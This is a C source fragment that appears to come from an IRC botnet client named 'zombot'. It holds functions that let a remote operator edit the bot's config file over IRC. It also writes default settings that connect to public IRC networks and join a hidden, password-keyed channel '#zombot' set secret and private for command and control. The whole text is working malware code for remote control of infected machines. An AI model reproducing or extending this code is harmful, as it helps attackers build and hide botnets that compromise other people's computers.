
void ini_cmd(int n)
{

  if (!stricmp(strv[n], "list"))
  {
    do_dump(irc_inifile);
  }

  if (!stricmp(strv[n], "del"))
  {
    DeleteFile(irc_inifile);
    irc_reply("--- removed\n");
  }

  if (!stricmp(strv[n], "add"))
  {
    HANDLE h = fopen_ap(irc_inifile);
    if (h == INVALID_HANDLE_VALUE) return;
    fappendline(h, ptrv[n+1]);
    CloseHandle(h);
    irc_reply("--- added\n");
  }

}

void ini_load()
{
  HANDLE h = fopen_ro(irc_inifile);
  if (h == INVALID_HANDLE_VALUE)
  {
    h = fopen_new(irc_inifile);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD len;
    char* t = "$servlist add us.undernet.org 6666 6668\n"\
              "$servlist add eu.undernet.org 6666 6668\n"\
              "$servlist add ca.undernet.org 6666 6668\n"\
              "$servlist add us.rr.efnet.net 6666 6668\n"\
              "$servlist add eu.rr.efnet.net 6666 6668\n"\
              "$servlist add ca.rr.efnet.net 6666 6668\n"\
              "$servlist add au.rr.efnet.net 6666 6668\n"\
              "JOIN #zombot z0mb0tkey\n"\
              "MODE #zombot +k z0mb0tkey\n"\
              "MODE #zombot +ntps\n"\
              "MODE #zombot -ilm\n";
    WriteFile(h, t,strlen(t), &len, 0);
    SetFilePointer(h, 0,0,FILE_BEGIN);
  }
  for (;;)
  {
    char t[256];
    fgetline(h, t, sizeof(t));
    if (t[0])
    {
        if ((t[0]=='$'))
        {
          strcpy(irc_recvstr, t);
          irc_parse();
          if (  online_mode ||
                (!stricmp(strv[0], "$servlist"))
             )
          {
            irc_caller[0] = irc_rpl = 0;
            action_single(0);
          }
        }
        else
        {
          if (online_mode)
            irc_send("%s\n", t);
        }
    } // t[0]
    if (irc_error) break;
    // do_pause()
    if (fgetline_eof) break;
  }
  CloseHandle(h);
}
